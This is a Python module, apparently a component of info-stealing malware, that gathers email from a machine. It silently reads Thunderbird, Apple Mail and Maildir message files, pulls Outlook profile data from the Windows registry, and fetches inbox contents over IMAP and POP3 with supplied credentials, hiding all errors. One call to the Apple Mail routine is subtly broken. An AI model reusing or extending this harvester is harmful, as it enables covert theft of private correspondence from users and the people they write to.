# Email Harvesting Module
import platform
import os
import json
import imaplib
import poplib
import smtplib
import email
from email.parser import Parser
from pathlib import Path
import glob

class EmailHarvester:
    def __init__(self):
        self.system = platform.system()
        self.emails = []
        
    def harvest_all(self):
        """Harvest emails from all sources"""
        results = {
            "system": self.system,
            "sources": {}
        }
        
        # Harvest from different sources
        results["sources"]["thunderbird"] = self.harvest_thunderbird()
        results["sources"]["outlook"] = self.harvest_outlook()
        results["sources"]["apple_mail"] = self.harvest_apple_mail()
        results["sources"]["maildir"] = self.harvest_maildir()
        
        return results
    
    def harvest_thunderbird(self):
        """Harvest emails from Thunderbird"""
        try:
            home = Path.home()
            
            # Linux
            profiles = list(home.glob(".thunderbird/*.default*/Mail/Local Folders/*"))
            # Mac
            if not profiles:
                profiles = list(home.glob("Library/Thunderbird/Profiles/*.default*/Mail/Local Folders/*"))
            
            emails = []
            
            for profile in profiles[:10]:  # Limit to 10 profiles
                if profile.is_file():
                    try:
                        with open(profile, 'r') as f:
                            content = f.read()
                            emails.append({
                                "source": str(profile),
                                "preview": content[:500]
                            })
                    except:
                        pass
            
            return {"success": True, "emails": emails, "count": len(emails)}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def harvest_outlook(self):
        """Harvest emails from Outlook"""
        try:
            if self.system == "Windows":
                import winreg
                
                # Try to get Outlook data file path
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook"
                    )
                    value, _ = winreg.QueryValueEx(key, "0900020b")
                    winreg.CloseKey(key)
                    
                    return {"success": True, "outlook_profile": str(value)}
                except:
                    pass
            
            return {"success": False, "message": "Outlook data not accessible"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def harvest_apple_mail(self):
        """Harvest emails from Apple Mail (macOS)"""
        try:
            if self.system != "Darwin":
                return {"success": False, "message": "Not macOS"}
            
            home = Path.home()
            mail_dir = home / "Library" / "Mail"
            
            emails = []
            
            # Find all .emlx files
            for emlx_file in mail_dir.rglob("*.emlx")[:50]:
                try:
                    with open(emlx_file, 'r') as f:
                        content = f.read()
                        emails.append({
                            "source": str(emlx_file),
                            "preview": content[:500]
                        })
                except:
                    pass
            
            return {"success": True, "emails": emails, "count": len(emails)}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def harvest_maildir(self):
        """Harvest emails from Maildir format"""
        try:
            home = Path.home()
            
            # Common Maildir locations
            maildirs = [
                home / "Maildir",
                home / ".maildir",
                home / "var" / "mail",
            ]
            
            emails = []
            
            for maildir in maildirs:
                if maildir.exists():
                    new_dir = maildir / "new"
                    if new_dir.exists():
                        for email_file in new_dir.iterdir():
                            if email_file.is_file():
                                try:
                                    with open(email_file, 'r') as f:
                                        content = f.read()
                                        emails.append({
                                            "source": str(email_file),
                                            "preview": content[:500]
                                        })
                                except:
                                    pass
            
            return {"success": True, "emails": emails, "count": len(emails)}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def connect_imap(self, server: str, username: str, password: str):
        """Connect to IMAP server and fetch emails"""
        try:
            mail = imaplib.IMAP4_SSL(server)
            mail.login(username, password)
            mail.select('inbox')
            
            status, messages = mail.search(None, 'ALL')
            email_ids = messages[0].split()
            
            emails = []
            
            for email_id in email_ids[:50]:  # Limit to 50 emails
                status, msg_data = mail.fetch(email_id, '(RFC822)')
                for response_part in msg_data:
                    if isinstance(response_part, tuple):
                        msg = email.message_from_bytes(response_part[1])
                        
                        emails.append({
                            "subject": msg.get('Subject', 'No Subject'),
                            "from": msg.get('From', 'Unknown'),
                            "date": msg.get('Date', 'Unknown'),
                            "body": self._extract_body(msg)[:500]
                        })
            
            mail.logout()
            
            return {"success": True, "emails": emails, "count": len(emails)}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def connect_pop3(self, server: str, username: str, password: str):
        """Connect to POP3 server and fetch emails"""
        try:
            pop = poplib.POP3_SSL(server)
            pop.user(username)
            pop.pass_(password)
            
            emails = []
            message_count = len(pop.list()[1])
            
            for i in range(1, min(message_count + 1, 51)):  # Limit to 50
                resp, lines, octets = pop.retr(i)
                msg_data = b'\r\n'.join(lines).decode('utf-8', errors='replace')
                msg = email.message_from_string(msg_data)
                
                emails.append({
                    "subject": msg.get('Subject', 'No Subject'),
                    "from": msg.get('From', 'Unknown'),
                    "date": msg.get('Date', 'Unknown'),
                    "body": self._extract_body(msg)[:500]
                })
            
            pop.quit()
            
            return {"success": True, "emails": emails, "count": len(emails)}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _extract_body(self, msg):
        """Extract email body"""
        try:
            if msg.is_multipart():
                for part in msg.walk():
                    content_type = part.get_content_type()
                    content_disposition = str(part.get("Content-Disposition"))
                    
                    if content_type == "text/plain" and "attachment" not in content_disposition:
                        return part.get_payload(decode=True).decode('utf-8', errors='replace')
            else:
                return msg.get_payload(decode=True).decode('utf-8', errors='replace')
        except:
            pass
        
        return "No body extracted"


def harvest_emails():
    """Quick email harvesting function"""
    eh = EmailHarvester()
    return eh.harvest_all()
